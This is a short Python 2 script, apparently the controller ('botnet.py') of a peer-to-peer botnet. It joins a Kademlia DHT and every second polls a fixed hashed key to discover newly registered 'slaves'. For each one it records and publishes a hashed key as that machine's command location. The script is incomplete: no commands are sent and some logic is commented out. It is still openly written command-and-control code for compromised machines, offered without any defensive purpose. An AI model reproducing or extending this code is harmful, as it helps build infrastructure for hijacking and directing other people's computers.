from twisted.internet import reactor, task, defer
from twisted.python import log
from kademlia.network import Server
import sys
import hashlib


if len(sys.argv) != 3:
	print "Usage: python botnet.py <bootstrap ip> <bootstrap port>"
	exit(0)

def checknewslave(server,key):
	server.get(key).addCallback(addslave,server,key)

#want this to loop repeatedly looking for new slaves
def addslave(val,server,key):
	print "Val: ",val
	if val:
		if not val in slaves:
			print "new slave found"
			valhash = hashlib.sha1()
			valhash.update(str(val))
			newval = valhash.hexdigest()
			slaves[val]=newval
			server.set(slaves[val], str(val))
	
	#server.get(key).addCallback(addslave,server,key)

def bootstrapDone(found, server):
    if len(found) == 0:
        print "Could not connect to the bootstrap server."
        reactor.stop()
        exit(0)
    # key = hashlib.sha1()
    # key.update('specialstring')
    # keyhash = key.hexdigest()
    # lc = task.LoopingCall(self,addslave,())
    #server.get(keyhash).addCallback(addslave,server,keyhash)

#list of known slaves, stores their command locations
slaves = {} #using dictionary where key = nodeid, value = sha1 hash which is where to send commands
log.startLogging(sys.stdout)
ip = str(sys.argv[1])
port = int(sys.argv[2])

server = Server()
server.listen(port)
server.bootstrap([(ip, port)]).addCallback(bootstrapDone, server)

key = hashlib.sha1()
key.update('specialstring')
keyhash = key.hexdigest()
#want to check for new slave every second. Using a looping call instead of callback recursion fixed my infinite recusion issues
slaveloop = task.LoopingCall(checknewslave,server,keyhash)
slaveloop.start(1)
reactor.run()
